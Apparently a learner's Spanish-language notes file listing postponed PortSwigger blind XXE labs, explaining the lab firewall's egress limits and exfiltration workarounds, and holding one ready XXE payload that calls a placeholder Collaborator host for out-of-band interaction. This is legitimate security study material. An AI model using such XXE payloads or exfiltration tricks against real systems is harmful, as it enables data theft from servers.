# Labs PortSwigger pendientes

Lista de labs que decidí saltar temporalmente y la razón. Cuando los retome, este archivo es el punto de entrada.

## Hallazgo importante sobre el firewall del lab (2026-05-04)

PortSwigger bloquea por firewall el tráfico saliente desde el navegador del bot a servicios externos arbitrarios: webhook.site, interactsh, requestbin, beeceptor, etc. todos quedan descartados antes de salir del entorno del lab. Solo se permite tráfico a:

- Burp Collaborator (`*.oastify.com`, `*.burpcollaborator.net`) — requiere Burp Suite Pro.
- El "exploit server" de PortSwigger cuando el lab lo provee explícitamente.

**Consecuencia operacional**: si un lab pide exfiltrar datos out-of-band y NO viene con exploit server, los workarounds tipo webhook.site no funcionan dentro del lab (sí funcionan fuera, en bug bounty real). Para esos labs hay dos rutas:
1. Burp Pro con Collaborator (oficial).
2. Auto-exfiltración same-origin: el script malicioso publica los datos robados como un comentario/post nuevo dentro del mismo lab; el atacante los lee navegando a esa página. Sin tráfico saliente.

## Labs aplazados

### XXE serie blind (requieren Burp Collaborator) — aplazados 2026-05-05

Los tres labs comparten la misma limitación: el endpoint `/product/stock` no refleja nada en la respuesta (blind), no hay exploit server provisto, y el firewall del lab bloquea egress a webhook.site/interactsh/requestbin. La ruta same-origin tampoco aplica porque el endpoint no almacena ni renderiza datos user-visible donde leerlos después. Único canal de salida: Collaborator (`*.oastify.com`), que requiere Burp Suite Professional.

- **Blind XXE with out-of-band interaction**
  https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction
  Razón: `infra-externa-bloqueada-por-firewall + endpoint blind sin exploit server`. Payload listo para retomar:
  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLAB.oastify.com"> ]>
  <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
  ```

- **Blind XXE with out-of-band interaction via XML parameter entities**
  https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
  Razón: misma limitación. Lab nuevo: introduce parameter entities (`%`) para usar SYSTEM dentro de un DTD interno donde general entities no sirven.

- **Exploiting blind XXE to exfiltrate data using a malicious external DTD**
  https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-exfiltration
  Razón: requiere hostear un DTD malicioso accesible desde el server del lab. Aunque hubiera workaround para hostearlo, la exfiltración igual va a Collaborator.

Cuando se retomen (con Burp Pro): hacer los tres en orden, son progresivos. El segundo introduce parameter entities, el tercero las combina con DTD remoto para exfiltración real de archivos en blind.

### Nota: el lab "data retrieval via error messages" SÍ es resoluble sin Pro

A pesar de estar en la categoría blind XXE, el lab `lab-xxe-with-data-retrieval-via-error-messages` se completó (sesión 20e). Provee exploit server donde hospedar el DTD malicioso (whitelisted en el firewall del lab). La exfiltración va por mensaje de error in-band, no por Collaborator. Ver writeup en `blind-xxe-data-retrieval-via-error-messages/`.

Lección genérica: aplazar un lab por "blind XXE" sin verificar si tiene exploit server es prematuro. Si el exploit server está disponible, el DTD remoto puede hospedarse ahí y la exfiltración puede ir por error messages.

## Histórico de razones que pueden volver a aparecer

- **infra-externa-bloqueada-por-firewall**: lab pide exfiltración OOB y no provee exploit server. Resoluble vía Burp Pro o auto-exfiltración same-origin (no vía webhook.site).
- **exploit-server-requerido**: lab depende de inducir a la víctima a visitar URL controlada por el atacante; para eso PortSwigger normalmente provee un "exploit server" gratuito en la barra superior del lab.
